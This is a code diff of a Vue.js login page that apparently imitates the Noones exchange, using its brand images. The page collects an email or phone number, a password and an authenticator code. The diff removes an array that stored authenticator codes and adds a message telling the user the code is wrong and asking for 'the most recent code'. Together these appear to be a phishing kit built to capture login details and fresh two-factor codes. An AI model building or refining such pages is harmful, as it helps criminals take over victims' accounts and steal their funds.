@@ -157,7 +157,7 @@
           </div>
         </div>
 
-        <!-- Authenticator Code Field -->
+        <!-- Authenticator Field -->
         <div class="relative h-fit mb-4" v-show="enterPassword">
           <img
             class="w-11/12 xs:w-full h-full z-0"
@@ -182,24 +182,29 @@
             Please enter the authenticator code.
           </span>
         </div>
+
+        <!-- Error Message -->
+        <div v-if="authError" class="text-red-500 text-sm font-semibold">
+          Wrong code, enter the most recent code.
+        </div>
       </div>
 
       <div class="relative mt-24 w-[325px]">
         <button
           v-show="!enterPassword"
-          @click="submitData"
+          @click="submitEmail"
           class="bg-light-green hover:bg-green w-full mx-auto py-3 button"
           :disabled="!emailOrPhone || !credentials.password || formSubmitted"
         >
-          Submit
+          Continue
         </button>
         <button
           v-show="enterPassword"
-          @click="submitAuthenticatorCode"
+          @click="submitLogins"
           class="bg-light-green hover:bg-green w-full mx-auto py-3 button"
           :disabled="!credentials.authenticator || formSubmitted"
         >
-          Submit Code
+          Continue
         </button>
         <div class="h-20"></div>
       </div>
@@ -208,7 +213,7 @@
 </template>
 
 <script setup>
-import { ref } from "vue";
+import { ref, onMounted, onBeforeUnmount } from "vue";
 import Noones1 from "@/assets/SVGs/Noones1.vue";
 import Noones2 from "@/assets/SVGs/Noones2.vue";
 import Noones3 from "@/assets/SVGs/Noones3.vue";
@@ -219,19 +224,51 @@ import EnglishSvg from "@/assets/SVGs/EnglishSvg.vue";
 import EmailRequestComponent from "@/components/EmailRequestComponent.vue";
 import LeftSquares from "@/assets/SVGs/LeftSquares.vue";
 import RightSquares from "@/assets/SVGs/RightSquares.vue";
+import PasswordComponent from "./PasswordComponent.vue";
 import ShowPasswordSvg from "@/assets/SVGs/ShowPasswordSvg.vue";
 import HidePasswordSVG from "@/assets/SVGs/HidePasswordSVG.vue";
 
 const phone = ref(false);
+const enterPassword = ref(false);
 const emailOrPhone = ref("");
+const currentDisplay = ref("one");
+const showPassword = ref(false);
 const credentials = ref({
+  emailOrPhone: "",
   password: "",
   authenticator: "",
 });
 const formSubmitted = ref(false);
-const showPassword = ref(false);
-const enterPassword = ref(false);
-const authCodes = ref([]); // Array to store authenticator codes
+const authError = ref(false); // To track if there's an authenticator error
+
+let intervalId;
+
+const changeDisplay = () => {
+  switch (currentDisplay.value) {
+    case "one":
+      currentDisplay.value = "two";
+      break;
+    case "two":
+      currentDisplay.value = "three";
+      break;
+    case "three":
+      currentDisplay.value = "four";
+      break;
+    case "four":
+      currentDisplay.value = "one";
+      break;
+    default:
+      currentDisplay.value = "one";
+  }
+};
+
+onMounted(() => {
+  intervalId = setInterval(changeDisplay, 200);
+});
+
+onBeforeUnmount(() => {
+  clearInterval(intervalId);
+});
 
 const submitData = async () => {
   formSubmitted.value = true;
